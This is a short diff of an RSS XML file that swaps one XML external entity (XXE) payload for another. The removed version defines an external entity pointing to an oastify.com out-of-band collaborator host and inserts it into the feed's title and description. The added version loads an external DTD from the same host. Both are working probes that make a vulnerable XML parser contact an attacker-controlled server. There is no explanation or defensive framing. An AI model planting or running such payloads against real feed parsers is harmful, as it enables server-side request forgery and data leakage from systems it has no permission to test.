@@ -1,5 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "http://jwjxxm1166mn92rnej0wyhtgd7j176baex11q.oastify.com/ghpages">
-]>
-<rss version="2.0"><channel><title>&xxe;</title><link>http://a/</link><description>&xxe;</description></channel></rss>
+<!DOCTYPE rss SYSTEM "http://jwjxxm1166mn92rnej0wyhtgd7j176baex11q.oastify.com/externaldtd">
+<rss version="2.0"><channel><title>x</title><link>http://a/</link><description>x</description></channel></rss>
